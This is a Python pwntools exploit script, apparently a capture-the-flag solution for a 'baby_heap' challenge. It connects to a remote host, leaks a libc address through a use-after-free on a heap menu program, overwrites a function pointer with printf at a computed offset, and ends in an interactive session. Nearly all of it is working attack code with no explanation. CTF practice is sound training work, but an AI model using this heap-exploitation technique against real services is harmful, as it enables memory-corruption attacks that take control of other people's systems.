from pwn import *
from pwn import p64,u64


context(log_level='debug')
p=remote("39.107.225.62", 36876)
# p=process("/home/ben/Desktop/attack_world/qiangwang24/baby_heap/baby_heap")
elf=ELF("/home/ben/Desktop/attack_world/qiangwang24/baby_heap/baby_heap")
libc=ELF("/home/ben/Desktop/attack_world/qiangwang24/baby_heap/libc-2.35.so")
offset=0x21a118
print(hex(libc.sym["puts"]))
print(hex(libc.sym["write"]))
print(hex(libc.sym["strncmp"]))
print(hex(libc.sym["strlen"]))
print(hex(libc.sym["putenv"]))
print(hex(libc.sym["getenv"]))


def Add(size:int):
    p.sendlineafter(b"choice:",b"1")
    p.sendlineafter(b"size",str(size).encode())
def Delete(index:int):
    p.sendlineafter(b"choice:",b"2")
    p.sendlineafter(b"delete:",str(index).encode())
def Edit(index:int,content:bytes):
    p.sendlineafter(b"choice:",b"3")
    p.sendlineafter(b"edit:",str(index).encode())
    p.sendlineafter(b"content",content)
def Show(index):
    p.sendlineafter(b"choice:",b"4")
    p.sendlineafter(b"show:",str(index).encode())
def Secret(index:int):
    p.sendlineafter(b"choice:",b"5")
    p.sendlineafter(b"sad !",str(index).encode())
Add(0x628)
Add(0x618)
Add(0x638)
Add(0x618)
Delete(1)
Show(1)
p.recv()
print(p.recv())
libc.address=u64(p.recv()[20:28]) - 0x21ace0
print(hex(libc.address))
target_addr = libc.address + offset
p.sendline(b"6")
p.sendafter(b"target addr \n",p64(target_addr))
p.send(p64(libc.sym["printf"]))
Secret(2)
p.interactive()